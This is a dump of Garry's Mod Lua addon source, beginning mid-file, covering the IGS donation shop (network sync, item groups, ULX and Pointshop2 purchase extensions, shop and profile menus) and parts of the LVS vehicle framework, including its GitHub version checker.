	util.AddNetworkString 'IGS.nw.PlayerSync'
	util.AddNetworkString 'IGS.nw.NilEntityVar'
	util.AddNetworkString 'IGS.nw.NilPlayerVar'
	util.AddNetworkString 'IGS.nw.EntityRemoved'
	util.AddNetworkString 'IGS.nw.PlayerRemoved'

	net.Receive('IGS.nw.PlayerSync', function(len, pl)
		if (pl.IGSEntityCreated ~= true) then
			hook.Call('PlayerEntityCreated', GAMEMODE, pl)

			pl.IGSEntityCreated = true

			for index, _vars in pairs(data) do
				for var, value in pairs(_vars) do
					local ent = Entity(index)
					if (not vars[var].LocalPlayerVar and not vars[var].NoSync) or (ent == pl) then
						vars[var]:_Send(ent, value, pl)
					end
				end
			end

			if (callbacks[pl] ~= nil) then
				for i = 1, #callbacks[pl] do
					callbacks[pl][i](pl)
				end
			end
			callbacks[pl] = nil
		end
	end)

	hook.Add('EntityRemoved', 'IGS.nw.EntityRemoved', function(ent)
		local index = ent:EntIndex()
		if (index ~= 0) and (data[index] ~= nil) then -- For some reason this kept getting called on Entity(0), not sure why...
			if ent:IsPlayer() then
				net_Start('IGS.nw.PlayerRemoved')
					net_WriteUInt(index, 7)
				net_Broadcast()
			else
				net_Start('IGS.nw.EntityRemoved')
					net_WriteUInt(index, 12)
				net_Broadcast()
			end

			data[index] = nil
		end
	end)

	function IGS.nw.WaitForPlayer(pl, cback)
		if (pl.IGSEntityCreated == true) then
			cback(pl)
		else
			if (callbacks[pl] == nil) then
				callbacks[pl] = {}
			end
			callbacks[pl][#callbacks[pl] + 1] = cback
		end
	end

	function IGS.nw.SetGlobal(var, value)
		globals[var] = value
		if (value ~= nil) then
			vars[var]:_Send(0, value)
		else
			net_Start('IGS.nw.NilEntityVar')
				net_WriteUInt(0, 12)
				net_WriteUInt(vars[var].ID, bitcount)
			vars[var]:SendFunc(0, value)
		end
	end

	function ENTITY:SetIGSVar(var, value)
		local index = self:EntIndex()

		if (not data[index]) then
			data[index] = {}
		end

		data[index][var] = value

		if (value ~= nil) then
			vars[var]:_Send(self, value)
		else
			if self:IsPlayer() then
				net_Start('IGS.nw.NilPlayerVar')
				net_WriteUInt(index, 7)
			else
				net_Start('IGS.nw.NilEntityVar')
				net_WriteUInt(index, 12)
			end
				net_WriteUInt(vars[var].ID, bitcount)
			vars[var]:SendFunc(self, value)
		end
	end
else
	hook.Add('InitPostEntity', 'IGS.nw.InitPostEntity', function()
		net_Start('IGS.nw.PlayerSync')
		net_Send()
	end)

	net.Receive('IGS.nw.NilEntityVar', function()
		local index, id = net_ReadUInt(12), net_ReadUInt(bitcount)
		if data[index] and mappings[id] then
			data[index][mappings[id].Name] = nil
		end
	end)

	net.Receive('IGS.nw.NilPlayerVar', function()
		local index, id = net_ReadUInt(7), net_ReadUInt(bitcount)
		if data[index] and mappings[id] then
			data[index][mappings[id].Name] = nil
		end
	end)

	net.Receive('IGS.nw.EntityRemoved', function()
		data[net_ReadUInt(12)] = nil
	end)

	net.Receive('IGS.nw.PlayerRemoved', function()
		data[net_ReadUInt(7)] = nil
	end)
end
--PATH addons/igs-core/lua/igs/objects/shop_group.lua:
--[[-------------------------------------------------------------------------
В магазине есть категории, а есть группы товаров.

Категория - это группа подобных товаров.
Например, випы и премиумы

Группа это может быть разновидность одного товара.
Например группа вип прав содержит в себе вип на неделю, месяц, навсегда и т.д.

Этот файл представляет собой регистратор ГРУПП
---------------------------------------------------------------------------]]

local ITEM_GROUP = {}
ITEM_GROUP.__index = ITEM_GROUP
ITEM_GROUP.__tostring = function(self)
	-- "ITEM GROUP (Name Of Group) [i]"
	return "IGS GROUP (" .. self:Name() .. ")[" .. #self:Items() .. "]"
end
debug.getregistry().IGSGroup = ITEM_GROUP



-- Fade, Tiger, Damascus
function ITEM_GROUP:AddItem(STORE_ITEM,sNameOverride)
	if self.items.STORED[STORE_ITEM:UID()] then
		return self.items.STORED[STORE_ITEM:UID()]
	end

	local dat = {
		item = STORE_ITEM,
		name = sNameOverride or STORE_ITEM:Name()
	}

	local ID = #self.items.MAP + 1
	self.items.MAP[ID] = dat
	self.items.STORED[STORE_ITEM:UID()] = dat

	STORE_ITEM.group = self

	return self.items.MAP[ID]
end

function ITEM_GROUP:SetIcon(sIconUrl)
	self.icon_url = sIconUrl
	return self
end

function ITEM_GROUP:SetHighlightColor(color)
	if CLIENT then
		self.highlight = color
	end
	return self
end




function ITEM_GROUP:Name()
	return self.name
end

function ITEM_GROUP:UID() -- TODO
	return self:Name()
end

function ITEM_GROUP:Items()
	return self.items.MAP
end

function ITEM_GROUP:ICON()
	return self.icon_url
end




IGS.GROUPS = IGS.GROUPS or {}

-- Flip Knifes
function IGS.NewGroup(sName)
	if IGS.GROUPS[sName] then
		return IGS.GROUPS[sName]
	end

	local group = setmetatable({
		name = sName,
		items = {
			MAP    = {}, -- iter, STORED
			STORED = {}  -- STORE_ITEM:UID(),
		},
	},ITEM_GROUP)

	IGS.GROUPS[sName] = group

	return group
end

function IGS.GetGroups()
	return IGS.GROUPS
end

function IGS.GetGroup(name)
	return IGS.GROUPS[name]
end
--PATH addons/igs-core/lua/igs/extensions/pointshop2.lua:
local STORE_ITEM = FindMetaTable("IGSItem")

function STORE_ITEM:SetPremiumPoints(iAmount)
	return self:SetInstaller(function(pl)
		pl:PS2_AddPremiumPoints(iAmount)
	end):SetMeta("ps2_prempoints", iAmount)
end

function STORE_ITEM:SetPoints(iAmount)
	return self:SetInstaller(function(pl)
		pl:PS2_AddStandardPoints(iAmount, "/donate")
	end):SetMeta("ps2_points", iAmount)
end

--PATH addons/igs-core/lua/igs/extensions/ulx.lua:
IGS.ITEMS.ULX = IGS.ITEMS.ULX or {
	GROUPS = {},
	PEX    = {}
}


local STORE_ITEM = FindMetaTable("IGSItem")

function STORE_ITEM:SetULXGroup(sUserGroup, iGroupWeight)
	self:SetCanActivate(function(pl) -- invDbID
		if pl:IsUserGroup(sUserGroup) then
			return "У вас уже діє ця послуга"
		end
	end)
	self:SetInstaller(function(pl)
		RunConsoleCommand("ulx", "adduserid", pl:SteamID(), sUserGroup)
		pl.IGSULXWeight = iGroupWeight
	end)
	self:SetValidator(function(pl)
		local valid = false
		if pl.IGSULXWeight then
			valid = iGroupWeight <= pl.IGSULXWeight
		else
			valid = pl:IsUserGroup(sUserGroup)
		end

		if not valid then
			IGS.NotifyAll("Автовідновлення " .. self:Name() .. " для " .. pl:Name())
			return false
		end
	end)


	self.ulx_group = self:Insert(IGS.ITEMS.ULX.GROUPS, sUserGroup)
	self.ulx_group_weight = iGroupWeight
	return self
end

-- Есть много ньюансов. Коммит 1 октября 2019
function STORE_ITEM:SetULXCommandAccess(cmd,tag) -- "ulx model","^", например
	self:SetInstaller(function(pl)
		if not tag then
			table.insert(ULib.ucl.authed[ pl:UniqueID() ].allow, cmd)
		else
			ULib.ucl.authed[ pl:UniqueID() ].allow[cmd] = tag
		end
	end)
	self:SetValidator(function()
		return false
	end)


	self.ulx_command = self:Insert(IGS.ITEMS.ULX.PEX, cmd)
	return self
end


if CLIENT then return end

local function checkGroups(pl)
	local hasAccess = IGS.PlayerHasOneOf(pl, IGS.ITEMS.ULX.GROUPS[ pl:GetUserGroup() ])
	if hasAccess == nil then return end

	if hasAccess then
		pl.IGSULXWeight = hasAccess.ulx_group_weight
		return -- если имеется хоть одна покупка, то не снимаем права
	end

	RunConsoleCommand("ulx","removeuserid",pl:SteamID())
end

local function hasPexAccess(pl, cmd)
	local hasAccess = IGS.PlayerHasOneOf(pl, IGS.ITEMS.ULX.PEX[cmd])
	return hasAccess ~= false -- nil, если не продается
end

local function checkPermissions(pl)
	local user = ULib.ucl.authed[ pl:UniqueID() ]
	if not user then return end

	local changed
	-- Вид ucl таблицы https://img.qweqwe.ovh/1523035793058.png
	for k,v in pairs(user.allow or {}) do -- не уверен, что allow обязательно есть
		local cmd = isnumber(k) and v or k

		if not hasPexAccess(pl, cmd) then
			user.allow[k] = nil
			changed = true
		end
	end

	if changed then
		ULib.ucl.saveUsers()
	end
end

timer.Simple(.1, function() -- чтобы этот хук обязательно был после RestorePex. История ВК 20 мая с Антон Панченко
hook.Add("IGS.PlayerPurchasesLoaded", "ULXGroupsAndPEX", function(pl)
	if next(IGS.ITEMS.ULX.GROUPS) then
		checkGroups(pl)
	end

	if next(IGS.ITEMS.ULX.PEX) then
		checkPermissions(pl)
	end
end, HOOK_HIGH)
end)

--PATH addons/igs-core/lua/igs/interface/activities/main.lua:
local null = function() end
local etoGlavnayaVkladkaBlya = true

hook.Add("IGS.CatchActivities","main",function(activity,sidebar)
	-- Зона прокрутки последних покупок http://joxi.ru/12MQQBlfzPnw2J
	local bg = sidebar:AddPage("Останні покупки")

	-- Панель тегов и готовая кнопка сброса фильтров
	local tagspan = uigs.Create("Panel", bg)
	tagspan:SetWide(activity:GetWide())
	tagspan.Paint = function(s,w,h)
		IGS.S.Panel(s,w,h,nil,nil,nil,true)
	end

	-- сетка https://img.qweqwe.ovh/1487714173294.png
	bg.tags = uigs.Create("DIconLayout", function(tags)
		tags:SetWide(activity:GetWide() - 5 - 5)
		tags:SetPos(5,5)
		tags:SetSpaceX(10)
		tags:SetSpaceY(10)
		tags.Paint = null

		function tags:AddTag(sName,doClick)
			local tag = uigs.Create("igs_button")
			tag:SetTall(18)
			tag:SetText(" " .. sName .. " ") -- костыль для расширения кнопки
			tag:SizeToContents()
			tag.DoClick = doClick

			self:Add(tag)

			tags:InvalidateLayout(true) -- tags:GetTall()
			tagspan:SetTall(tags:GetTall() + 5 + 5)

			local y = tagspan:GetTall()

			-- Расхождение вот тут:
			-- https://img.qweqwe.ovh/1493840355855.png
			-- y = y - 10 -- UPD 2020 t.me/c/1353676159/7888

			bg.categs:SetTall(activity:GetTall() - y - activity.tabBar:GetTall())
			bg.categs:SetPos(0,y)
			return tag
		end
	end, tagspan)

	bg.categs = uigs.Create("igs_panels_layout_list", bg) -- center panel
	bg.categs:DisableAlignment(true)
	bg.categs:SetWide(activity:GetWide())

	-- Раскомментить, если захочу убрать теги
	-- bg.categs:SetTall(activity:GetTall() - activity.tabBar:GetTall())
	-- bg.categs:SetPos(0,y)


	-- category = true
	local cats = {}

	local function addItems(fItemsFilter,fGroupFilter)
		local rows = {}

		for _,GROUP in pairs( IGS.GetGroups() ) do -- name
			if fGroupFilter and fGroupFilter(GROUP) == false then continue end

			local pnl = uigs.Create("igs_group"):SetGroup(GROUP)
			pnl.category = GROUP:Items()[1].item:Category() -- предполагаем, что в одной группе будут итемы одной категории

			table.insert(rows,pnl)
		end

		-- не (i)pairs, потому что какой-то ID в каком-то очень редком случае может отсутствовать
		-- если его кто-то принудительно занилит, чтобы убрать итем например.
		-- Хотя маловероятно, но все же
		for _,ITEM in pairs(IGS.GetItems()) do
			if fItemsFilter and fItemsFilter(ITEM) == false then continue end
			if ITEM:IsHidden() then continue end -- еще в IGS.WIN.Group
			if ITEM:Group()    then continue end -- группированные итемы засунуты в группу выше
			if ITEM.isnull     then continue end -- пустышка

			local pnl = uigs.Create("igs_item"):SetItem(ITEM)
			pnl.category = ITEM:Category()

			table.insert(rows,pnl)
		end

		for _,pnl in ipairs(rows) do
			bg.categs:Add(pnl,pnl.category or "Різне").title:SetTextColor(IGS.col.TEXT_HARD) -- http://joxi.ru/Y2LqqyBh5BODA6
			cats[pnl.category or "Різне"] = true
		end
	end
	addItems()



	--[[-------------------------------------------------------------------------
		Теги (Быстрый выбор категории)
	---------------------------------------------------------------------------]]
	bg.tags:AddTag("Скидання фільтрів",function() bg.categs:Clear() addItems() end)
		:SetActive(true)

	for categ in pairs(cats) do
		bg.tags:AddTag(categ,function(self)
			bg.categs:Clear()

			-- #todo переписать это говнище
			addItems(function(ITEM)
				return self.categ == "Різне" and not ITEM:Category() or (ITEM:Category() == self.categ)
			end,function(GROUP)
				return self.categ == "Різне" and not GROUP:Items()[1].item:Category() or (GROUP:Items()[1].item:Category() == self.categ)
			end)
		end).categ = categ
	end



	--[[-------------------------------------------------------------------------
		Список последних покупок в сайдбаре
	---------------------------------------------------------------------------]]
	IGS.GetLatestPurchases(function(latest_purchases)
		if not IsValid(activity) then return end

		local function addPurchasePanel(v)
			local b = uigs.Create("Panel")
			b:SetTall(IGS.SERVERS.TOTAL > 1 and 100 or 100 - 20)
			b:DockPadding(5,5,5,5)

			local pnl = uigs.Create("Panel", b)
			pnl:Dock(FILL)
			pnl:DockPadding(5,5,5,5)
			pnl.Paint = IGS.S.RoundedPanel
			function pnl:AddRow(sName,value)
				local row = uigs.Create("Panel", pnl)
				row:Dock(TOP)
				row:SetTall(20)
				--:DockMargin(5,5,0,5)
				--row.Paint = IGS.S.RoundedPanel

				-- key
				uigs.Create("DLabel", function(name)
					name:Dock(LEFT)
					name:SetWide(55)
					name:SetText(sName)
					name:SetFont("igs.18")
					name:SetTextColor(IGS.col.TEXT_HARD)
					name:SetContentAlignment(6)
				end, row)

				uigs.Create("DLabel", function(name)
					name:Dock(FILL)
					name:SetText(value)
					name:SetFont("igs.18")
					name:SetTextColor(IGS.col.TEXT_SOFT)
					name:SetContentAlignment(4)
				end, row)
			end

			-- Заголовок услуги. Легко превращается в лейбу
			uigs.Create("DButton", function(name)
				name:Dock(TOP)
				name:SetTall(20)
				name:SetText(IGS.GetItemByUID(v.item):Name())
				name:SetFont("igs.18")
				name:SetTextColor(IGS.col.HIGHLIGHTING)
				name:SetContentAlignment(4)
				name.Paint = null
				name.DoClick = function()
					IGS.WIN.Item(v.item)
				end
			end, b)

			pnl:AddRow("Купив: ",v.nick or "NoName")
			if IGS.SERVERS.TOTAL > 1 then
				pnl:AddRow("На: ",IGS.ServerName(v.server))
			-- else
			-- 	pnl:AddRow("UID: ",v.item)
			end
			pnl:AddRow("До: ",IGS.TimestampToDate(v.expire) or "назавжди")

			bg.side:AddItem(b)
		end

		for _,purchase in ipairs(latest_purchases) do
			local ITEM = IGS.GetItemByUID(purchase.item)
			if ITEM.isnull then continue end

			addPurchasePanel(purchase)
		end
	end)

	activity:AddTab("Послуги",bg,"materials/ukrainerp/uah.png",etoGlavnayaVkladkaBlya)
end)

-- local p = IGS.UI()
-- timer.Simple(3,function() if IsValid(p) then p:Remove() end end)

--PATH addons/igs-core/lua/igs/interface/activities/profile.lua:
-- Профиль, где транзакции и прогресс до след. бонуса, а также место в топе донатеров за месяц, бизнес левел
-- Прототип https://pp.vk.me/c638927/v638927381/1ec19/nQnaytZDxls.jpg (Вышло совсем не как задумано)
-- Стоимость услуги по текущему курсу

local LP
hook.Add("IGS.CatchActivities","profile",function(activity,sidebar)
	LP = LP or LocalPlayer()

	local bg = sidebar:AddPage("Інформація профілю")
	local ava_bg = uigs.Create("Panel", function(self)
		local y = 5

		-- Аватар
		local sw     = bg.side:GetWide() -- 220
		local margin = (sw - 184) * 0.5
		uigs.Create("AvatarImage", function(ava)
			ava:SetSize(184,184)
			ava:SetPos(margin,y)
			ava:SetPlayer(LP,184)

			y = y + 184
		end, self)

		-- Ник
		uigs.Create("DLabel", function(nick)
			nick:SetSize(sw,24)
			nick:SetPos(0,y)
			nick:SetFont("igs.24")
			nick:SetTextColor(IGS.col.HIGHLIGHTING)
			nick:SetText(LP:Nick())
			nick:SetContentAlignment(5)

			y = y + nick:GetTall()
		end, self)

		-- Стимайди
		uigs.Create("DLabel", function(sid)
			sid:SetSize(sw,18)
			sid:SetPos(0,y)
			sid:SetFont("igs.18")
			sid:SetTextColor(IGS.col.TEXT_SOFT)
			sid:SetText("(" .. LP:SteamID() .. ")")
			sid:SetContentAlignment(5)

			y = y + sid:GetTall() + 10
		end, self)

		function self:AddRow(sName,sVal)
			local row_bg = uigs.Create("Panel", self)
			row_bg:SetSize(sw,20) -- 20, как и размер шрифта
			row_bg:SetPos(0,y)

			-- Key
			local n = uigs.Create("DLabel", function(name)
				name:SetSize(80,row_bg:GetTall())
				name:SetPos(0,0)
				name:SetFont("igs.17")
				name:SetTextColor(IGS.col.TEXT_SOFT)
				name:SetText(sName)
				name:SetContentAlignment(6)
			end, row_bg)

			-- Value
			for i,line in ipairs(string.Wrap("igs.18",sVal,sw - n:GetWide() - 5)) do
				uigs.Create("DLabel", function(val)
					val:SetSize(sw - n:GetWide() - 5,n:GetTall())
					val:SetPos(n:GetWide() + 5,(i - 1) * val:GetTall())
					val:SetFont("igs.18")
					val:SetTextColor(IGS.col.TEXT_HARD)
					val:SetText(line)

					y = y + val:GetTall()
					row_bg:SetTall(row_bg:GetTall() + val:GetTall())
				end, row_bg)
			end

			self:SetTall(y + 5)
		end

		self:SetTall(y + 5)
	end)

	local lvl = IGS.PlayerLVL(LP)
	local mybal  = LP:IGSFunds()
	local next_lvl = not lvl and IGS.LVL.MAP[1] or lvl:GetNext()

	ava_bg:AddRow("Статус",lvl and lvl:Name() or "Ніхто :(")
	if next_lvl then
		local next_desc = next_lvl:Description()

		ava_bg:AddRow("Наступний статус", next_lvl:Name() .. (next_desc and ("\n\n%s"):format(next_desc) or ""))
		ava_bg:AddRow("Потрібно", next_lvl:Cost() - IGS.RealPrice( IGS.TotalTransaction(LP) ) .. " грн")
	end

	bg.side:AddItem(ava_bg)

	--[[-------------------------------------------------------------------------
		Основная часть фрейма
	---------------------------------------------------------------------------]]
	uigs.Create("igs_table", function(pnl)
		pnl:Dock(FILL)
		pnl:DockMargin(5,5,5,5)

		pnl:SetTitle("Транзакції")

		local multisv = IGS.SERVERS.TOTAL > 1
		if multisv then
			pnl:AddColumn("Сервер",100)
		else
			pnl:AddColumn("#",40)
		end

		pnl:AddColumn("Сума",60)
		pnl:AddColumn("Баланс",60)
		pnl:AddColumn("Дія")
		pnl:AddColumn("Дата",130)

		-- Обновление списка транзакций и информации в сайдбаре
		IGS.GetMyTransactions(function(dat)
			if not IsValid(pnl) then return end -- Долго данные получались

			local bit_num_limit = 2 ^ IGS.BIT_TX - 1
			if #dat == bit_num_limit then
				pnl:SetTitle("Останні " .. bit_num_limit .. " транзакцій")
			end

			for i,v in ipairs(dat) do
				v.note = v.note or "-"

				local function name_or_uid(sUid)
					local ITEM = IGS.GetItemByUID(sUid)
					return ITEM.isnull and sUid or ITEM:Name()
				end

				-- Если покупка, то пишем ее название или пишем с чем связана транзакция
				local note =
					v.note:StartWith("P: ") and name_or_uid(v.note:sub(4)) or
					v.note:StartWith("A: ") and ("Поповнення рахунку (" .. v.note:sub(4) .. ")") or
					v.note:StartWith("C: ") and ("Купон " .. v.note:sub(4,13) .. "...") or
					v.note

				pnl:AddLine(
					-- v.id,
					multisv and IGS.ServerName(v.server) or #dat - i + 1,
					v.sum,
					math.Truncate(mybal,2), -- не представляю как, но временами получались очень большие копейки
					note,
					IGS.TimestampToDate(v.date,true)
				):SetTooltip(("%s\n\nID транзакції в системі: %i%s"):format(
					note,
					v.id,
					note ~= v.note and ("\nОригінальна відмітка: " .. v.note) or ""
				))

				mybal = mybal - v.sum
			end

			local spent = IGS.isUser(LP) and (IGS.TotalTransaction(LP) - mybal) or 0

			local first = dat[ #dat ]
			ava_bg:AddRow("## Операцій",#dat .. " шт.")
			ava_bg:AddRow("∑ Операцій",IGS.SignPrice(spent))
			ava_bg:AddRow("1 Операція",first and IGS.TimestampToDate(first.date) or "Не було")

			IGS.AddButton(bg.side,"Активувати купон",IGS.WIN.ActivateCoupon) --.button:SetActive(true)

			bg.side:AddItem(uigs.Create("Panel", function(s)
				s:SetTall(5)
			end))

		end)
	end, bg)

	activity:AddTab("Профіль",bg,"materials/ukrainerp/user.png")
end)

-- IGS.UI()

--PATH addons/igs-core/lua/igs/modules/extra/init_cl.lua:
/*
list.Set("DesktopWindows", "IGS",{
	title = "Автодонат",
	icon  = "icon16/money_add.png",
	init  = function()
		IGS.UI()
	end
})
*/




--[[------------------------------------------------------
	Отобразится при первом открытии менюшки пополнения счета
	https://img.qweqwe.ovh/1492376581692.png - вот так
	Доступные шаблоны:

	{currency_name}  - название валюты (Алкобаксы)
	{currency_sign}  - сокращение валюты (Alc)
	{currency_price} - цена единицы валюты (5)
--------------------------------------------------------]]
IGS.C.AboutCurrencyText = [[
Автодонат має власну валюту - {currency_name} ({currency_sign}). Це, як долари, але у грі. Всі ціни в /donate магазині вказані в цій валюті.

Зараз 1 {currency_sign} коштує {currency_price} грн, но ціна може трохи вирости або упасти, залежить від деяких факторів.

Таким чином, якщо купити {currency_name} на 1000 грн, завтра може вийти так, що ця сама кількість буде коштувати вже, наприклад, 1200 грн і ви купили їх з вигодою (купили за 1000 те, що тепер інші повинні купувати за 1200)
]]


function IGS.WIN.AboutCurrency(bHideClose)
	local t = IGS.C.AboutCurrencyText:gsub("{currency_name}",IGS.C.CURRENCY_NAME)
		:gsub("{currency_sign}",IGS.C.CURRENCY_SIGN)
		:gsub("{currency_price}",IGS.GetCurrencyPrice())

	local modal = IGS.ShowNotify(t,"Краще прочитайте")

	if not bHideClose then return end
	modal.btnOK:SetVisible(false)
	timer.Simple(7,function()
		if IsValid(modal) then
			modal.btnOK:SetVisible(true)
		end
	end)
end


local function getReadCurrencyInfoStatus() -- true, если прочитано
	return bib.get("igs:currency_read") == "1"
end

local function setReadCurrencyInfoStatus(bRead)
	bib.set("igs:currency_read", bRead and 1 or 0)
end


hook.Add("IGS.OnDepositWinOpen","CurrencyInfo",function()
	if not IGS.IsCurrencyEnabled() then return end -- донат валюта отключена

	-- Ни разу не пополнял и не видел подсказки
	if not IGS.isUser(LocalPlayer()) and not getReadCurrencyInfoStatus() then
		timer.Simple(0,function() -- чтобы не оказаться позади igs_frame
			IGS.WIN.AboutCurrency(true)
			setReadCurrencyInfoStatus(true)
		end)
	end
end)

-- IGS.UI()

--PATH addons/lvs_base-main/lua/autorun/lvs_init.lua:

LVS = istable( LVS ) and LVS or {}

LVS.VERSION = 325
LVS.VERSION_GITHUB = 0
LVS.VERSION_TYPE = ".GIT"
LVS.VERSION_ADDONS_OUTDATED = false

LVS.KEYS_CATEGORIES = {}
LVS.KEYS_REGISTERED = {}
LVS.pSwitchKeys = {[KEY_1] = 1,[KEY_2] = 2,[KEY_3] = 3,[KEY_4] = 4,[KEY_5] = 5,[KEY_6] = 6,[KEY_7] = 7,[KEY_8] = 8,[KEY_9] = 9,[KEY_0] = 10}
LVS.pSwitchKeysInv = {[1] = KEY_1,[2] = KEY_2,[3] = KEY_3,[4] = KEY_4,[5] = KEY_5,[6] = KEY_6,[7] = KEY_7,[8] = KEY_8,[9] = KEY_9,[10] = KEY_0}

LVS.ThemeColor = Color(127,0,0,255)

LVS.WHEEL_BRAKE = 1
LVS.WHEEL_STEER_NONE = 2
LVS.WHEEL_STEER_FRONT = 3
LVS.WHEEL_STEER_REAR = 4

LVS.WEAPONS = {
	["DEFAULT"] = {
		Icon = Material("lvs/weapons/bullet.png"),
		Ammo = 9999,
		Delay = 0,
		HeatRateUp = 0.2,
		HeatRateDown = 0.25,
		Attack = function( ent ) end,
		StartAttack = function( ent ) end,
		FinishAttack = function( ent ) end,
		OnSelect = function( ent, old ) end,
		OnDeselect = function( ent, new ) end,
		OnThink = function( ent, active ) end,
		OnOverheat = function( ent ) end,
		OnRemove = function( ent ) end,
		OnReload = function( ent ) end,
	},
}

function LVS:GetVersion()
	return LVS.VERSION
end

function LVS:AddKey(name, category, printname, cmd, default)
	local data = {
		printname = printname,
		id = name,
		category = category,
		cmd = cmd,
	}

	if not LVS.KEYS_CATEGORIES[ category ] then
		LVS.KEYS_CATEGORIES[ category ] = {}
	end

	if SERVER then
		table.insert( LVS.KEYS_REGISTERED, data )
	else
		if default then
			if isstring( default ) then
				local Key = input.LookupBinding( default )

				if Key then
					default = input.GetKeyCode( Key )
				else
					default = 0
				end
			end
		else
			default = 0
		end

		data.default = default

		table.insert( LVS.KEYS_REGISTERED, data )

		CreateClientConVar( cmd, default, true, true )
	end
end

function LVS:CheckUpdates()
	http.Fetch("https://raw.githubusercontent.com/SpaxscE/lvs_base/main/lua/autorun/lvs_init.lua", function(contents,size) 
		local Entry = string.match( contents, "LVS.VERSION%s=%s%d+" )

		if Entry then
			LVS.VERSION_GITHUB = tonumber( string.match( Entry , "%d+" ) ) or 0
		else
			LVS.VERSION_GITHUB = 0
		end

		if LVS.VERSION_GITHUB == 0 then
			print("[LVS] - Framework: latest version could not be detected, You have Version: "..LVS:GetVersion())
		else
			if LVS:GetVersion() >= LVS.VERSION_GITHUB then
				print("[LVS] - Framework is up to date, Version: "..LVS:GetVersion())
			else
				print("[LVS] - Framework: a newer version is available! Version: "..LVS.VERSION_GITHUB..", You have Version: "..LVS:GetVersion())

				if LVS.VERSION_TYPE == ".GIT" then
					print("[LVS] - Framework: get the latest version at https://github.com/SpaxscE/lvs_base")
				else
					print("[LVS] - Framework: restart your game/server to get the latest version!")
				end

				if CLIENT then 
					timer.Simple(18, function() 
						chat.AddText( Color( 255, 0, 0 ), "[LVS] - Framework: a newer version is available!" )
					end)
				end
			end
		end

		local Delay = 0
		local addons = file.Find( "data_static/lvs/*", "GAME" )

		for _, addonFile in pairs( addons ) do
			local addonInfo = file.Read( "data_static/lvs/"..addonFile, "GAME" )

			if not addonInfo then continue end

			local data = string.Explode( "\n", addonInfo )

			local wsid = string.Replace( addonFile, ".txt", "" )
			local addon_name = wsid
			local addon_url
			local addon_version

			for _, entry in pairs( data ) do
				if string.StartsWith( entry, "url=" ) then
					addon_url = string.Replace( entry, "url=", "" )
				end

				if string.StartsWith( entry, "version=" ) then
					addon_version = string.Replace( entry, "version=", "" )
				end

				if string.StartsWith( entry, "name=" ) then
					addon_name = string.Replace( entry, "name=", "" )
				end
			end

			if not addon_url or not addon_version then continue end

			addon_version = tonumber( addon_version )

			Delay = Delay + 1.5

			timer.Simple( Delay, function()
				http.Fetch(addon_url, function(con,_) 
					local addon_entry = string.match( con, "version=%d+" )

					local addon_version_git = 0

					if addon_entry then
						addon_version_git = tonumber( string.match( addon_entry, "%d+" ) ) or 0
					end

					local wsurl = "https://steamcommunity.com/sharedfiles/filedetails/?id="..wsid

					if addon_version_git == 0 then
						print("[LVS] latest version of "..addon_name.." ( "..wsurl.." ) could not be detected, You have Version: "..addon_version)
					else
						if addon_version_git > addon_version then
							print("[LVS] - "..addon_name.." ( "..wsurl.." ) is out of date!")

							if CLIENT then 
								timer.Simple(18, function() 
									chat.AddText( Color( 255, 0, 0 ),"[LVS] - "..addon_name.." is out of date!" )
								end)
							end

							LVS.VERSION_ADDONS_OUTDATED = true

						else
							print("[LVS] - "..addon_name.." is up to date, Version: "..addon_version)
						end
					end
				end)
			end )
		end
	end)
end

function LVS:GetWeaponPreset( name )
	if not LVS.WEAPONS[ name ] then return table.Copy( LVS.WEAPONS["DEFAULT"] ) end

	return table.Copy( LVS.WEAPONS[ name ] )
end

function LVS:AddWeaponPreset( name, data )
	if not isstring( name ) or not istable( data ) then return end

	LVS.WEAPONS[ name ] = data
end

function LVS:GetVehicleTypes()
	local VehicleTypes = {}

	for s, v in pairs( scripted_ents.GetList() ) do
		if not v.t or not isfunction( v.t.GetVehicleType ) then continue end

		local vehicletype = v.t:GetVehicleType()

		if not isstring( vehicletype ) or string.StartsWith( vehicletype, "LBase" ) or table.HasValue( VehicleTypes, vehicletype ) then continue end

		table.insert( VehicleTypes, vehicletype )
	end

	return VehicleTypes
end

AddCSLuaFile("lvs_framework/init.lua")
include("lvs_framework/init.lua")
--PATH addons/lvs_base-main/lua/lvs_framework/autorun/cl_camera.lua:

function LVS:CalcView( vehicle, ply, pos, angles, fov, pod )
	local view = {}
	view.origin = pos
	view.angles = angles
	view.fov = fov
	view.drawviewer = false

	if not pod:GetThirdPersonMode() then return view end

	local mn = vehicle:OBBMins()
	local mx = vehicle:OBBMaxs()
	local radius = ( mn - mx ):Length()
	local radius = radius + radius * pod:GetCameraDistance()

	local TargetOrigin = view.origin + ( view.angles:Forward() * -radius ) + view.angles:Up() * radius * pod:GetCameraHeight()
	local WallOffset = 4

	local tr = util.TraceHull( {
		start = view.origin,
		endpos = TargetOrigin,
		filter = function( e )
			local c = e:GetClass()
			local collide = not c:StartWith( "prop_physics" ) and not c:StartWith( "prop_dynamic" ) and not c:StartWith( "prop_ragdoll" ) and not e:IsVehicle() and not c:StartWith( "gmod_" ) and not c:StartWith( "lvs_" ) and not c:StartWith( "player" ) and not e.LVS

			return collide
		end,
		mins = Vector( -WallOffset, -WallOffset, -WallOffset ),
		maxs = Vector( WallOffset, WallOffset, WallOffset ),
	} )

	view.origin = tr.HitPos
	view.drawviewer = true

	if tr.Hit and  not tr.StartSolid then
		view.origin = view.origin + tr.HitNormal * WallOffset
	end

	return view
end

hook.Add( "CalcView", "!!!!LVS_calcview", function(ply, pos, angles, fov)
	if ply:GetViewEntity() ~= ply then return end

	local pod = ply:GetVehicle()
	local vehicle = ply:lvsGetVehicle()

	if not IsValid( pod ) or not IsValid( vehicle ) then return end

	local newfov = vehicle:LVSCalcFov( fov, ply )

	local base = pod:lvsGetWeapon()

	if IsValid( base ) then
		local weapon = base:GetActiveWeapon()

		if weapon and weapon.CalcView then
			return ply:lvsSetView( weapon.CalcView( base, ply, pos, angles, newfov, pod ) )
		else
			return ply:lvsSetView( vehicle:LVSCalcView( ply, pos, angles, newfov, pod ) )
		end
	else
		local weapon = vehicle:GetActiveWeapon()

		if weapon and weapon.CalcView then
			return ply:lvsSetView( weapon.CalcView( vehicle, ply, pos, angles, newfov, pod ) )
		else
			return ply:lvsSetView( vehicle:LVSCalcView( ply, pos, angles, newfov, pod ) )
		end
	end
end )

--PATH addons/lvs_base-main/lua/lvs_framework/autorun/cl_fonts.lua:
local THE_FONT = {
	font = "Verdana",
	extended = false,
	size = 14,
	weight = 600,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
}
